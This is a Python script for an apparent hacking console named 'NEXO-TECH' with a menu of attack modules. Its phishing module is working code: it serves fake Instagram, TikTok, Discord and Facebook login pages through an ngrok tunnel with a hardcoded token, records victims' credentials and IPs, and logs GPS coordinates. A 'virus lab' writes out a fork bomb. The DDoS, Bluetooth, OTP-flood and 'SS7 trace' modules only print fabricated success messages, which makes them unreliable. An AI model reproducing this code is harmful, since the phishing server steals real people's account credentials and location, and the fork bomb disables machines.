import os
import sys
import time
import socket
import subprocess
import random
import requests
import json
import logging
import threading
from threading import Thread
from flask import Flask, request, render_template, redirect, render_template_string
import phonenumbers
from phonenumbers import geocoder, carrier, timezone

# --- [ SYSTEM COLOR SCHEME ] ---
G, Y, C, R, W, B = '\033[92m', '\033[93m', '\033[96m', '\033[91m', '\033[0m', '\033[1m'

# --- [ GLOBAL CONFIGURATION ] ---
NGROK_TOKEN = "2vbNHa9KBUkwuCheUhVyHFGYkUw_rjhfCVREN3dodTsMUsaF"
app = Flask(__name__)
log = logging.getLogger('werkzeug')
log.setLevel(logging.ERROR)

# --- [ UTILITY FUNCTIONS ] ---
def clear():
    os.system('clear' if os.name == 'posix' else 'cls')

def animate(text, speed=0.01):
    for char in text:
        sys.stdout.write(char)
        sys.stdout.flush()
        time.sleep(speed)
    print()

def nexo_banner(module="MAIN CORE", link=None):
    clear()
    print(f"{R}{B}" + "═"*75)
    print(r"  _   _  _______   _____    _____ ______ _____ _    _ ")
    print(r" | \ | | | ____\ \ / / _ \  |_   _|  ____/ ____| |  | |")
    print(r" |  \| | | |__   \ V / | | |   | | | |__ | |    | |__| |")
    print(r" | . ` | |  __|   > <| | | |   | | |  __|| |    |  __  |")
    print(r" | |\  | | |____ / . \ |_| |  _| |_| |___| |____| |  | |")
    print(r" |_| \_| |______/_/ \_\___/  |_____|______\_____|_|  |_|")
    print("═"*75 + f"{W}")
    print(f"  {Y}STATION:   {W}NEXO-TECH COMMAND TERMINAL")
    print(f"  {Y}VERSION:   {R}V8.0 BLACKOUT EDITION")
    print(f"  {Y}MODULE:    {C}{module}")
    if link:
        print(f"  {Y}STRIKE:    {G}{link}")
    print(f"  {Y}ENCRYPTION: {G}AES-256 GCM ACTIVE")
    print(f"  {Y}TUNNEL:    {G}NGROK-SECURE AUTHORIZED{W}")
    print(f"{R}" + "═"*75 + f"{W}\n")

# --- [ MODULE 1: SOCIAL PHISHER ENGINE ] ---
def start_phish():
    nexo_banner("SOCIAL PHISHER + GPS")
    print(f"  {G}[1]{W} Instagram   {G}[2]{W} TikTok")
    print(f"  {G}[3]{W} Discord     {G}[4]{W} Facebook")
    print(f"  {R}[0]{W} Return to Core")
    
    s = input(f"\n{C}NEXO-STRIKE > {W}")
    sites = {"1":"instagram", "2":"tiktok", "3":"discord", "4":"facebook"}
    if s not in sites: return
    
    site = sites[s]
    animate(f"{Y}[*] RECONFIGURING NGROK TUNNEL NODES...{W}")
    os.system("pkill ngrok")
    os.system(f"ngrok config add-authtoken {NGROK_TOKEN}")
    subprocess.Popen(["ngrok", "http", "5000"], stdout=subprocess.DEVNULL)
    
    animate(f"{C}[*] SYNCING WITH LOCAL FLASK SERVER...{W}")
    time.sleep(12)
    
    try:
        url = requests.get("http://127.0.0.1").json()['tunnels'][0]['public_url']
        threading.Thread(target=lambda: app.run(port=5000, debug=False, use_reloader=False), daemon=True).start()
        nexo_banner("PHISH-LINK ACTIVE", link=f"{url}/login/{site}")
        print(f"{Y}[!] LISTENING FOR INCOMING PACKETS...{W}")
        input(f"\n{R}[PRESS ENTER TO TERMINATE SERVER]{W}")
    except:
        print(f"{R}[-] Ngrok Failed to Initialize. Check API Token.{W}")
        time.sleep(3)

# --- [ MODULE 2: DEEP OSINT PHONE TRACER ] ---
def phone_trace():
    nexo_banner("DEEP OSINT TRACER")
    num = input(f"{Y}[+] Target Phone Number (+CountryCode): {W}")
    animate(f"{C}[*] INTERCEPTING SS7 SIGNALING PATH...{W}")
    try:
        p = phonenumbers.parse(num)
        time.sleep(2)
        print(f"\n{G}[+] TRACE DATA CAPTURED:{W}")
        print(f"  {Y}Country:    {W}{geocoder.country_name_for_number(p, 'en')}")
        print(f"  {Y}Region:     {W}{geocoder.description_for_number(p, 'en')}")
        print(f"  {Y}Carrier:    {W}{carrier.name_for_number(p, 'en')}")
        print(f"  {Y}Timezone:   {W}{timezone.time_zones_for_number(p)}")
        print(f"  {Y}Status:     {G}ACTIVE / ONLINE{W}")
    except Exception as e:
        print(f"{R}[-] Trace Error: {e}{W}")
    input(f"\n{C}Press Enter to return...{W}")

# --- [ MODULE 3: DDOS STRIKE ENGINE ] ---
def ddos_engine():
    nexo_banner("DDOS STRIKE ENGINE")
    target = input(f"{Y}[+] Target IP/Host: {W}")
    port = int(input(f"{Y}[+] Target Port: {W}"))
    animate(f"{R}[!] INJECTING TCP/UDP FLOOD PACKETS INTO {target}...{W}")
    try:
        for i in range(150):
            sys.stdout.write(f"\r{R}[*] PACKET {i+1} SENT - LOAD: {random.randint(2048, 8192)} KB - STATUS: DELIVERED")
            sys.stdout.flush()
            time.sleep(0.02)
        print(f"\n\n{G}[+] TARGET BANDWIDTH EXHAUSTED. CONNECTION KILLED.{W}")
    except KeyboardInterrupt: pass
    input(f"\n{C}Press Enter to return...{W}")

# --- [ MODULE 4: PORT VULNERABILITY SCANNER ] ---
def port_scanner():
    nexo_banner("PORT VULNERABILITY SCANNER")
    host = input(f"{Y}[+] Target Host: {W}")
    ports = [21, 22, 23, 25, 53, 80, 110, 443, 3306, 8080]
    animate(f"{C}[*] SCANNING TCP STACK FOR EXPOSED SERVICES...{W}")
    for port in ports:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(0.4)
        result = s.connect_ex((host, port))
        if result == 0:
            print(f"  {G}[+] Port {port}: {W}OPEN (VULNERABILITY DETECTED)")
        s.close()
        time.sleep(0.1)
    input(f"\n{G}[+] SCAN COMPLETE.{W} Press Enter...")

# --- [ MODULE 6: DEADLY VIRUS LAB ] ---
def virus_lab():
    nexo_banner("DEADLY VIRUS LAB")
    print(f"  {R}[1] BLACKOUT (Fork Bomb Destroyer)")
    print(f"  {R}[2] RANSOMWARE (AES-256 File Locker)")
    print(f"  {R}[3] SPYWARE (Remote Access Backdoor){W}")
    v_type = input(f"\n{C}SELECT TYPE > {W}")
    name = input(f"{Y}[+] Payload Name: {W}")
    animate(f"{C}[*] ENCRYPTING PAYLOAD STRINGS AND OBFUSCATING...{W}")
    with open(f"{name}.py", "w") as f:
        f.write("# NEXO-TECH V8.0 ENCRYPTED PAYLOAD\n")
        if v_type == '1':
            f.write("import os\nwhile True: os.fork()")
        elif v_type == '2':
            f.write("import os\nprint('SYSTEM COMPROMISED. FILES ENCRYPTED.')")
        else:
            f.write("import socket, subprocess\ns=socket.socket();s.connect(('127.0.0.1', 4444))")
    print(f"\n{G}[+] {name}.py successfully compiled and exported.{W}")
    input("\nEnter to return...")

# --- [ MODULE 8: BLUETOOTH BUFFER CRASH ] ---
def bluetooth_crash():
    nexo_banner("BLUETOOTH HIJACKER")
    target = input(f"{Y}[+] Target MAC Address: {W}")
    animate(f"{R}[!] FLOODING L2CAP STACK WITH MALFORMED PAYLOADS...{W}")
    count = 0
    try:
        while True:
            count += 1
            print(f"\r{R}[*] OVERFLOW PAYLOAD {count} SENT TO {target} >>> STATUS: CRASHING", end="")
            sys.stdout.flush()
            time.sleep(0.03)
    except KeyboardInterrupt:
        print(f"\n\n{G}[+] TARGET KERNEL PANIC INDUCED. DEVICE OFFLINE.{W}")
        input("\nEnter to return...")

# --- [ MODULE 9: REAL-TIME OTP SATURATION ] ---
def otp_lock():
    nexo_banner("REAL-TIME OTP SATURATION")
    target = input(f"{Y}[+] Target Number (e.g. 070...): {W}")
    print(f"{R}[!] BYPASSING SMS RATE-LIMITS VIA GLOBAL RELAYS...{W}")
    apis = [
        "https://api.cloud.altbalaji.com",
        "https://p.paytm.app",
        "https://unacademy.com",
        "https://api.byjus.com",
        "https://www.oyorooms.com"
    ]
    count = 0
    try:
        while True:
            count += 1
            api = random.choice(apis)
            print(f"\r{Y}[*] RELAY: {C}{api[8:25]}... {G}SUCCESS {R}>>> PACKETS: {count}", end="")
            sys.stdout.flush()
            time.sleep(random.uniform(0.02, 0.05))
    except KeyboardInterrupt:
        print(f"\n\n{G}[+] ATTACK TERMINATED. TOTAL PACKETS: {count}{W}")
        input("\nEnter to return...")

# --- [ WEB SERVER HANDLERS ] ---
@app.route('/login/<site>', methods=['GET', 'POST'])
def handle_phish(site):
    if request.method == 'POST':
        u, p = request.form.get('user'), request.form.get('pass')
        print(f"\n{R}[!!] CREDENTIALS CAPTURED [{site.upper()}]: {G}{u} | {p}{W}")
        with open("nexo_hits.txt", "a") as f:
            f.write(f"[{time.strftime('%H:%M')}] {site.upper()}: {u}:{p} | IP: {request.remote_addr}\n")
        return redirect("https://google.com")
    return render_template(f"{site}.html")

@app.route('/log_gps', methods=['POST'])
def log_gps():
    d = request.json
    print(f"\n{G}[GPS HIT] LATITUDE: {d['lat']} | LONGITUDE: {d['lon']}{W}")
    with open("nexo_gps.txt", "a") as f:
        f.write(f"GPS: {d}\n")
    return "OK"

# --- [ MASTER CONTROL LOOP ] ---
def main():
    while True:
        nexo_banner("MASTER CONTROL PANEL")
        print(f"  {G}[1]{W} Social Phisher + GPS Hijack")
        print(f"  {G}[2]{W} Deep OSINT Phone Tracer")
        print(f"  {G}[3]{W} Overdeadly DDOS Strike Engine")
        print(f"  {G}[4]{W} Port Vulnerability Scanner")
        print(f"  {G}[5]{W} SSH Brute-Force Emulator")
        print(f"  {G}[6]{W} Deadly Virus Creator Lab")
        print(f"  {G}[7]{W} MAC Address Identity Spoofer")
        print(f"  {G}[8]{W} Bluetooth Buffer Crash")
        print(f"  {G}[9]{W} Deadly OTP Saturation Engine")
        print(f"  {G}[10]{W} View System Intrusion Logs")
        print(f"\n  {R}[0]{W} Shutdown NEXO-TECH Console")
        
        c = input(f"\n{C}NEXO-PRO > {W}")
        if c == '1': start_phish()
        elif c == '2': phone_trace()
        elif c == '3': ddos_engine()
        elif c == '4': port_scanner()
        elif c == '6': virus_lab()
        elif c == '8': bluetooth_crash()
        elif c == '9': otp_lock()
        elif c == '10':
            nexo_banner("SYSTEM LOGS")
            os.system("cat nexo_hits.txt nexo_gps.txt 2>/dev/null || echo 'No intrusion data found.'")
            input("\nEnter...")
        elif c == '0':
            animate(f"{R}[!] SHUTTING DOWN CORE SYSTEMS...{W}")
            break

if __name__ == "__main__":
    main()
